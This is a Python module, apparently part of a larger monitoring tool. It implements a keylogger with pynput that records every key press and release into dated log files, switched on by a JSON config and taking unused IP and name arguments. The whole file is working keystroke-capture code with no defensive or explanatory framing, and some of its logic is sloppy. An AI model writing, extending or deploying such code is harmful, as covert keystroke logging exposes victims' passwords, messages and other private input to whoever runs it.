from pynput import keyboard
import threading, datetime, sys ,json

threads_done = threading.Event()

class C_Keyboard:
    """ Capture keyboard events """
    
    def __init__(self,start=False,name="None",ip="None",path_json=None,path_log=None):
        """Start the listener"""
        
        self.name = name
        self.ip = ip
        self.path_json = path_json
        self.path_log = path_log
        self.config = self.get_config()
        
        # Collect events until released
        if start == True:
            # Collect events until released
            while True:
                if self.config['CAPTURE_KEYBOARD']['LOG'] == True:
                    while True:
                        self.now = datetime.datetime.now()
                        self.format_date = str(self.now.strftime("%d_%m_%Y"))
                        
                        with keyboard.Listener(on_press=self.on_press,on_release=self.on_release) as listener:
                            listener.join()
                            self.listener = keyboard.Listener(on_press=self.on_press,on_release=self.on_release)
                            self.listener.start()
                else:
                    while True:
                        pass
        
    def get_config(self):
        """ Get json config beceause i have la flemme """
        
        try:
            
            with open(self.path_json, 'r') as file:
                data = json.load(file)
                return data
            
        except:return False
        
    def on_release(self,key):
        """ Capture keyboard release """
        
        with open("{}.keyboard/log_{}.log".format(self.path_log, self.format_date), "a") as file:    
            
            if str(key) == '<96>':file.write(str(0))
            elif str(key) == '<97>':file.write(str(1))
            elif str(key) == '<98>':file.write(str(2))
            elif str(key) == '<99>':file.write(str(3))
            elif str(key) == '<100>':file.write(str(4))
            elif str(key) == '<101>':file.write(str(5))
            elif str(key) == '<102>':file.write(str(6))
            elif str(key) == '<103>':file.write(str(7))
            elif str(key) == '<104>':file.write(str(8))
            elif str(key) == '<105>':file.write(str(9))
            # elif key == keyboard.Key.esc:return False# Stop listener
            else:
                if key != keyboard.Key.space or key != keyboard.Key.enter:
                    file.write('{}'.format(key))
        
    def on_press(self,key):
        """ Capture keyboard press """
        
        try: 
            if key.char != None: pass#print(key.char)
        except AttributeError: 
            with open("{}.keyboard/log_{}.log".format(self.path_log, self.format_date), "a") as file:
                if key == keyboard.Key.space:file.write(' ')
                elif key == keyboard.Key.enter:file.write('\n[enter]\n')
                else:
                    if key != keyboard.Key.space or key != keyboard.Key.enter:
                        file.write('{}'.format(key))
                
# C DEGUEU MAIS CA SOULER JE SAIS :D
if len(sys.argv) >= 2:
    start = sys.argv[1]
    ip = sys.argv[2]
    name = sys.argv[3]
    path_json = sys.argv[5]
    path_log = sys.argv[4]
   
    start = start.split('=')[1] if '=' in start else start
    ip = ip.split('=')[1] if '=' in ip else ip
    name = name.split('=')[1] if '=' in name else name
    path_json = path_json.split('=')[1] if '=' in path_json else path_json
    path_log = path_log.split('=')[1] if '=' in path_log else path_log

    if start == "True":start = True
    elif start == "False":start = False
   
    server_c_mouse = C_Keyboard(start=start,name=name,ip=ip,path_json=path_json,path_log=path_log)

    
    threads_done.clear()
    sys.exit() #close terminal if exist
else:pass#osef
